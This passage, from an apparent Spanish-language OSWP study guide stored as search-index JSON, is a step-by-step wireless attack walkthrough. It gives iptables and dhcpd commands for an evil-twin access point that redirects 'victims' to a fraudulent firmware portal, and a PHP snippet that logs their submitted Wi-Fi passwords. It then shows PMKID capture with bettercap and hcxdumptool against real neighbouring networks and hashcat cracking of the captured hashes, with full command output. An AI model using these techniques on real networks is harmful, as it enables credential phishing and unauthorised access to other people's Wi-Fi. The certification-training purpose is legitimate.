enrutamiento habilitado en nuestro equipo.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#control-y-creacion-de-reglas-de-enrutamiento-por-iptables","title":"Control y creaci\u00f3n de reglas de enrutamiento por iptables","text":"<p>A continuaci\u00f3n, limpiamos cualquier tipo de regla que tengamos previamente definida de iptables y generamos nuestras nuevas reglas:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --flush\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --table nat --flush\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --delete-chain\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --table nat --delete-chain\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables --append FORWARD --in-interface at0 -j ACCEPT\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #iptables -t nat -A POSTROUTING -j MASQUERADE\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>La idea es nutrir nuestra interfaz at0 de la conexi\u00f3n padre eth0, de esta forma, los usuarios que se conecten a nuestro AP podr\u00e1n navegar por internet sin mayor inconveniente (en otras palabras, crear un t\u00fanel de conexi\u00f3n).</p> <p>Asimismo, cualquier tr\u00e1fico HTTP que detectemos por parte de nuestras v\u00edctimas, ser\u00e1 redireccionado a nuestra p\u00e1gina web fraudulenta, con el objetivo de hacerles creer que realmente el router necesita de una configuraci\u00f3n de Firmware y por ello solicita las credenciales de acceso a la red.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#sincronizacion-de-reglas-definidas-con-el-fake-ap","title":"Sincronizaci\u00f3n de reglas definidas con el Fake AP","text":"<p>Ya por \u00faltimo, lo que nos queda es sincronizar todas nuestras reglas definidas con el Fake AP, para que cobre vida y comience a operar bajo nuestras reglas:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0\nInternet Systems Consortium DHCP Server 4.4.1\nCopyright 2004-2018 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nConfig file: /etc/dhcpd.conf\nDatabase file: /var/lib/dhcp/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nWrote 2 leases to leases file.\nListening on LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25\nSending on   LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25\nSending on   Socket/fallback/fallback-net\n</code></pre> <p>Si obtenemos un output como el anterior, es que todo se ha realizado correctamente. Una vez llegados a este punto, lo que procedemos desde otra consola es a aplicar un ataque de deautenticaci\u00f3n global (FF:FF:FF:FF:FF:FF) contra toda la red.</p> <p>Tras los clientes lanzar paquetes Probe Request en busca del AP, como el leg\u00edtimo queda anulado debido a los paquetes que estamos de manera continua enviando, los dispositivos se confundir\u00e1n y har\u00e1n que estos se conecten a nuestro Fake AP, \u00bfpor qu\u00e9 sin autenticarse?, porque nuestro Fake AP es de protocolo OPN :)</p> <p>Esto del lado de la v\u00edctima es casi inperceptible, pues la migraci\u00f3n de una red a otra para algunos dispositivos es casi inmediata. Ya dependiendo de la imaginaci\u00f3n, originalidad e ingenio de cada uno, se podr\u00e1 obtener lo deseado una vez la v\u00edctima se mueve por nuestros terrenos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#robo-de-datos","title":"Robo de datos","text":"<p>Como es de esperar, una vez la v\u00edctima navegue por una p\u00e1gina HTTP, ser\u00e1 redireccionada a nuestro portal web falso. A nivel de direcci\u00f3n URL, figurar\u00e1 el dominio al cual ha accedido, es decir, no figurar\u00e1 nuestra direcci\u00f3n IP.</p> <p>Una vez esta introduce sus credenciales, estas ser\u00e1n enviadas a nuestra base de datos y a trav\u00e9s del servicio MYSQL de forma interactiva las podremos visualizar sin mayor problema.</p> <p>Otra forma m\u00e1s c\u00f3moda en caso de no haber querido tirar de MYSQL, podr\u00eda haber sido para el ACTION del HTML principal, haber definido un nuevo archivo post.php con una estructura semejante como esta:</p> <pre><code>&lt;?php $file = 'wifi-password.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv=\"refresh\" content=\"0; url=http://192.168.1.1\" /&gt;\n</code></pre> <p>De manera que tras introducir las credenciales de acceso, estas son depositadas en nuestro equipo en la ruta /var/www/html, en el fichero wifi-password.txt. De igual manera, en caso de introducir m\u00faltiples contrase\u00f1as por parte de varios clientes, estas se van apilando, pudiendo ver todo el hist\u00f3rico de contrase\u00f1as introducidas.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-a-redes-sin-clientes","title":"Ataque a redes sin clientes","text":"<p>Hasta ahora, hemos visto todas las t\u00e9cnicas necesarias para averiguar la contrase\u00f1a de una red Wifi que funcione por protocolo WPA/WPA2 y autenticaci\u00f3n PSK, pero siempre con la condici\u00f3n de que esta debe de poseer clientes.</p> <p>\u00bfQu\u00e9 pasa si la red no cuenta con clientes?, \u00bfse puede averiguar la contrase\u00f1a?, la respuesta es s\u00ed, y no... no es con un ataque de falsa autenticaci\u00f3n.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#clientless-pkmid-attack","title":"Clientless PKMID Attack","text":"<p>Esta nueva metodolog\u00eda nos permitir\u00e1 romper la seguridad de WPA y WPA2 mediante el denominado Pairwise Master Key Identifier o PMKID, una caracter\u00edstica roaming habilitada en muchos dispositivos.</p> <p>La principal diferencia con ataques existentes es que en este ataque, la captura de un EAPOL o saludo de 4-v\u00edas no es necesaria, como en casos anteriores. El nuevo ataque es realizado con el RSN IE (Robust Network Information Element) de una simple trama EAPOL, lo cual es flipante y maravilloso.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-desde-bettercap","title":"Ataque desde Bettercap","text":"<p>Aunque no lo hago as\u00ed, os lo explico tambi\u00e9n. Imaginemos que queremos capturar los Hashes de m\u00faltiples redes inal\u00e1mbricas de nuestro entorno. Olvid\u00e9monos ya de los Handshakes, y de ataques de de-autenticaci\u00f3n y todas estas t\u00e9cnicas que hab\u00edamos visto previamente.</p> <p>Lo primero como siempre es ponerse en modo monitor, y desde Bettercap efectuar el siguiente procedimiento:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/opt/bettercap]\n\u2514\u2500\u2500\u257c #./bettercap -iface wlan0mon\nbettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]\n\n wlan0mon  \u00bb wifi.recon on\n[22:38:15] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)\n[22:38:16] [sys.log] [inf] wifi started (min rssi: -200 dBm)\n wlan0mon  \u00bb [22:38:16] [sys.log] [inf] wifi channel hopper started.\n wlan0mon  \u00bb [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_2A51 (-94 dBm) detected as 78:29:ed:a9:2a:52 (Askey Computer Corp).\n wlan0mon  \u00bb [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_A908 (-83 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).\n wlan0mon  \u00bb [22:38:18] [wifi.ap.new] wifi access point MOVISTAR_1677 (-55 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).\n wlan0mon  \u00bb [22:38:19] [wifi.ap.new] wifi access point MIWIFI_psGP (-95 dBm) detected as 50:78:b3:ee:bb:ac.\n wlan0mon  \u00bb [22:38:19] [wifi.client.new] new station 20:34:fb:b1:c5:53 detected for MOVISTAR_1677 (1c:b0:44:d4:16:78)\n wlan0mon  \u00bb w[22:38:20] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).\n wlan0mon  \u00bb wifi.[22:38:21] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-81 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).\n wlan0mon  \u00bb wifi.[22:38:21] [wifi.ap.new] wifi access point LowiF7D3 (-90 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).\n wlan0mon  \u00bb wifi.show[22:38:21] [wifi.ap.new] wifi access point vodafone4038 (-91 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).\n wlan0mon  \u00bb wifi.show[22:38:21] [wifi.ap.new] wifi access point MOVISTAR_3126 (-94 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).\n wlan0mon  \u00bb wifi.show\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 RSSI \u25b4  \u2502       BSSID       \u2502        SSID         \u2502    Encryption    \u2502         WPS          \u2502 Ch \u2502 Clients \u2502 Sent  \u2502 Recvd \u2502   Seen   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 -57 dBm \u2502 1c:b0:44:d4:16:78 \u2502 MOVISTAR_1677       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 6  \u2502 1       \u2502 486 B \u2502 172 B \u2502 22:38:19 \u2502\n\u2502 -83 dBm \u2502 f8:8e:85:df:3e:13 \u2502 Wlan1               \u2502 WPA (TKIP, PSK)  \u2502 1.0                  \u2502 9  \u2502         \u2502       \u2502       \u2502 22:38:20 \u2502\n\u2502 -84 dBm \u2502 fc:b4:e6:99:a9:09 \u2502 MOVISTAR_A908       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 1  \u2502         \u2502       \u2502       \u2502 22:38:17 \u2502\n\u2502 -85 dBm \u2502 30:d3:2d:58:3c:6b \u2502 devolo-30d32d583c6b \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 11 \u2502         \u2502       \u2502       \u2502 22:38:22 \u2502\n\u2502 -86 dBm \u2502 10:62:d0:f6:f7:d8 \u2502 LowiF7D3            \u2502 WPA2 (TKIP, PSK) \u2502 2.0                  \u2502 11 \u2502         \u2502       \u2502       \u2502 22:38:22 \u2502\n\u2502 -92 dBm \u2502 28:9e:fc:0c:40:3e \u2502 vodafone4038        \u2502 WPA2 (TKIP, PSK) \u2502 2.0                  \u2502 11 \u2502         \u2502       \u2502       \u2502 22:38:21 \u2502\n\u2502 -94 dBm \u2502 50:78:b3:ee:bb:ac \u2502 MIWIFI_psGP         \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 6  \u2502         \u2502       \u2502       \u2502 22:38:19 \u2502\n\u2502 -94 dBm \u2502 78:29:ed:a9:2a:52 \u2502 MOVISTAR_2A51       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 1  \u2502         \u2502       \u2502       \u2502 22:38:16 \u2502\n\u2502 -94 dBm \u2502 cc:d4:a1:0c:31:28 \u2502 MOVISTAR_3126       \u2502 WPA2 (CCMP, PSK) \u2502 2.0 (not configured) \u2502 11 \u2502         \u2502       \u2502       \u2502 22:38:21 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nwlan0mon (ch. 13) / \u2191 0 B / \u2193 26 kB / 112 pkts\n\n wlan0mon  \u00bb  \n</code></pre> <p>Ya viendo que se nos listan todas las redes, corremos el siguiente comando:</p> <pre><code> wlan0mon  \u00bb wifi.assoc all\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2A51 (channel:1 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_A908 (channel:1 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2F95 (channel:1 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MIWIFI_psGP (channel:6 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:6 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP Wlan1 (channel:9 encryption:WPA)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP vodafone4038 (channel:11 encryption:WPA2)\n wlan0mon  \u00bb [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_3126 (channel:11 encryption:WPA2)\n wlan0mon  \u00bb [22:39:19] [sys.log] [inf] wifi sending association request to AP LowiF7D3 (channel:11 encryption:WPA2)\n wlan0mon  \u00bb [22:39:19] [sys.log] [inf] wifi sending association request to AP devolo-30d32d583c6b (channel:11 encryption:WPA2)\n wlan0mon  \u00bb [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:112 encryption:WPA2)\n wlan0mon  \u00bb [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_PLUS_1677 (channel:112 encryption:WPA2)\n wlan0mon  \u00bb [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb  \n</code></pre> <p>Sencillo, \u00bfverdad?, pues ya est\u00e1, as\u00ed de f\u00e1cil. En el fichero /root/bettercap-wifi-handshakes.pcap ahora lo \u00fanico que tenemos que pasar es la herramienta hcxpcaptool para convertir a Hashes nuestras capturas y listo.</p> <p>Prefiero comentar esta parte con m\u00e1s detalle en los siguientes puntos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-via-hcxdumptool","title":"Ataque via hcxdumptool","text":"<p>Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando para capturar todos los PKMID's posibles:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #hcxdumptool -i wlan0mon -o Captura --enable_status=1\ninitialization...\nwarning: NetworkManager is running with pid 27706\nwarning: wpa_supplicant is running with pid 27684\nwarning: wlan0mon is probably a monitor interface\n\nstart capturing (stop with ctrl+c)\nINTERFACE................: wlan0mon\nERRORMAX.................: 100 errors\nFILTERLIST...............: 0 entries\nMAC CLIENT...............: b0febdab6d9d\nMAC ACCESS POINT.........: 24336c5495c9 (incremented on every new client)\nEAPOL TIMEOUT............: 150000\nREPLAYCOUNT..............: 62752\nANONCE...................: 5e37baf7d8026ae9a9b5dcd74239558a74149218819377f2d3d866aa4c6249ab\n\n[22:42:02 - 001] fcb4e699a909 -&gt; b0febdab6d9d [FOUND PMKID CLIENT-LESS]\n[22:42:08 - 006] 1cb044d41678 -&gt; b0febdab6d9d [FOUND PMKID CLIENT-LESS]\nINFO: cha=11, rx=1314, rx(dropped)=602, tx=117, powned=2, err=0\n</code></pre> <p>Y como vemos, en cuesti\u00f3n de segundos tengo 2 redes vulnerables de las cuales he obtenido el PKMID. En este punto, estar\u00edamos igual que con Bettercap, es decir, tenemos la captura, \u00bfy ahora qu\u00e9?, descubr\u00e1moslo en el siguiente punto.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#uso-de-hcxpcaptool","title":"Uso de hcxpcaptool","text":"<p>Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un PKMID de 2 redes distintas. Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contrase\u00f1a de la red inal\u00e1mbrica:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #hcxpcaptool -z myHashes Captura \n\nreading from Captura\n\nsummary:                                        \n--------\nfile name........................: Captura\nfile type........................: pcapng 1.0\nfile hardware information........: x86_64\nfile os information..............: Linux 4.19.0-parrot1-13t-amd64\nfile application information.....: hcxdumptool 5.1.7\nnetwork type.....................: DLT_IEEE802_11_RADIO (127)\nendianness.......................: little endian\nread errors......................: flawless\npackets inside...................: 30\nskipped packets (damaged)........: 0\npackets with GPS data............: 0\npackets with FCS.................: 30\nbeacons (total)..................: 9\nbeacons (WPS info inside)........: 6\nauthentications (OPEN SYSTEM)....: 9\nauthentications (BROADCOM).......: 7\nEAPOL packets (total)............: 12\nEAPOL packets (WPA2).............: 12\nPMKIDs (total)...................: 2\nPMKIDs (WPA2)....................: 12\nPMKIDs from access points........: 2\nbest PMKIDs......................: 2\n\n2 PMKID(s) written to myHashes\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #cat myHashes \n0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038\n2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737\n</code></pre> <p>ANOTACI\u00d3N: Para saber a qu\u00e9 redes pertenecen estos Hashes, tan s\u00f3lo tenemos que visualizar el valor comprendido entre el primer y segundo asterisco. Corresponden a las BSSID's de los AP's.</p> <p>Y estos, ya pueden ser pasados por hashcat para someterlos a la fase de Cracking:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/usr/share/wordlists]\n\u2514\u2500\u2500\u257c #hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt \nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU\n\nOpenCL Platform #2: The pocl project\n====================================\n* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.\n\nHashes: 2 digests; 2 unique digests, 2 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers:\n* Zero-Byte\n* Slow-Hash-SIMD-LOOP\n\nMinimum password length supported by kernel: 8\nMaximum password length supported by kernel: 63\n\nWatchdog: Temperature abort trigger set to 90c\n\n* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'\nDictionary cache hit:\n* Filename..: rockyou.txt\n* Passwords.: 14344387\n* Bytes.....: 139921538\n* Keyspace..: 14344387\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s\n\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: myHashes\nTime.Started.....: Mon Aug 12 22:48:04 2019 (3 secs)\nTime.Estimated...: Mon Aug 12 22:53:08 2019 (5 mins, 1 sec)\nGuess.Base.......: File (rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    93064 H/s (55.72ms) @ Accel:512 Loops:128 Thr:64 Vec:1\nRecovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts\nProgress.........: 610384/28688774 (2.13%)\nRejected.........: 446544/610384 (73.16%)\nRestore.Point....: 0/14344387 (0.00%)\nRestore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3712-3840\nCandidates.#1....: 123456789 -&gt; sunflower15\nHardware.Mon.#1..: Temp: 64c Util: 99% Core:1670MHz Mem:3504MHz Bus:8\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s\n\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: myHashes\nTime.Started.....: Mon Aug 12 22:48:04 2019 (7 secs)\nTime.Estimated...: Mon Aug 12 22:53:09 2019 (4 mins, 58 secs)\nGuess.Base.......: File (rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    91919 H/s (55.94ms) @ Accel:512 Loops:128 Thr:64 Vec:1\nRecovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts\nProgress.........: 1292574/28688774 (4.51%)\nRejected.........: 801054/1292574 (61.97%)\nRestore.Point....: 387112/14344387 (2.70%)\nRestore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3840-3968\nCandidates.#1....: sunflower11 -&gt; 22lovers\nHardware.Mon.#1..: Temp: 66c Util:100% Core:1657MHz Mem:3504MHz Bus:8\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; \n</code></pre> <p>En mi caso, tiro de GPU y os puedo decir que el tiempo total para cracker estos hashes es de 5 minutos. (Aunque tambi\u00e9n se puede ver en el output anterior).</p> <p>Se podr\u00eda decir que es una gozada, porque nos estamos olvidando tanto de aircrack como de aireplay, de airodump, pyrit, airolib, cowpatty, genpmk, etc.</p> <p>Una vez crackeada la contrase\u00f1a, esta es mostrada:</p> <pre><code>[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s\n\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: myHashes\nTime.Started.....: Mon Aug 12 22:48:04 2019 (1 min, 51 secs)\nTime.Estimated...: Mon Aug 12 22:52:25 2019 (2 mins, 30 secs)\nGuess.Base.......: File (rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    89458 H/s (57.26ms) @ Accel:512 Loops:128 Thr:64 Vec:1\nRecovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts\nProgress.........: 15218868/28688774 (53.05%)\nRejected.........: 5388468/15218868 (35.41%)\nRestore.Point....: 7545850/14344387 (52.60%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2944\nCandidates.#1....: horneybabe1987 -&gt; groovejet\nHardware.Mon.#1..: Temp: 86c Util: 99% Core:1632MHz Mem:3504MHz Bus:8\n\nApproaching final keyspace - workload adjusted.  \n\n2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXX\n\nSession..........: hashcat\nStatus...........: Exhausted\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: myHashes\nTime.Started.....: Mon Aug 12 22:48:04 2019 (3 mins, 36 secs)\nTime.Estimated...: Mon Aug 12 22:51:40 2019 (0 secs)\nGuess.Base.......: File (rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    88906 H/s (47.34ms) @ Accel:512 Loops:128 Thr:64 Vec:1\nRecovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts\nProgress.........: 28688774/28688774 (100.00%)\nRejected.........: 9469826/28688774 (33.01%)\nRestore.Point....: 14344387/14344387 (100.00%)\nRestore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: 0133112024erdalk -&gt; KqpsEFunpo7w29nrbx4H\nHardware.Mon.#1..: Temp: 88c Util: 99% Core:1632MHz Mem:3504MHz Bus:8\n\nStarted: Mon Aug 12 22:48:02 2019\nStopped: Mon Aug 12 22:51:42 2019\n</code></pre> <p>O tambi\u00e9n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/usr/share/wordlists]\n\u2514\u2500\u2500\u257c #cat myHashes \n0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038\n2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737\n\u250c\u2500[root@parrot]\u2500[/usr/share/wordlists]\n\u2514\u2500\u2500\u257c #hashcat -m 16800 --show myHashes \n2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXXXXXX\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataques-por-wps","title":"Ataques por WPS","text":"<p>Ya como casi \u00faltimo de los puntos a tratar para redes de protocolo WPA/WPA2, no puedo acabar la secci\u00f3n sin mencionar el famoso WPS.</p> <p>Desde mi experiencia, os podr\u00eda estar comentando ahora mismo c\u00f3mo usar pixiedust, reaver o derivados, pero prefiero mostraros herramientas de utilidad que realmente den resultados, o que por lo menos tengan una tasa de \u00e9xito m\u00e1s probable.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#uso-de-wpspingenerator","title":"Uso de WPSPinGenerator","text":"<p>Si os fij\u00e1is, en todo el Gist, hemos hecho la gran parte de procedimientos a mano, me refiero, sin hacer uso de herramientas automatizadas. No suelo acostumbrar a hacer uso de herramientas que te automatizan un procedimiento, sobre todo por la curiosidad que me causa el c\u00f3mo funciona esa por debajo. Sin embargo, para este caso, hay una de ellas especialmente destinadas a WPS que s\u00ed que utilizo, por la gran tasa de acierto de la que dispone.</p> <p>El sistema operativo Wifislax, se podr\u00eda decir que es un 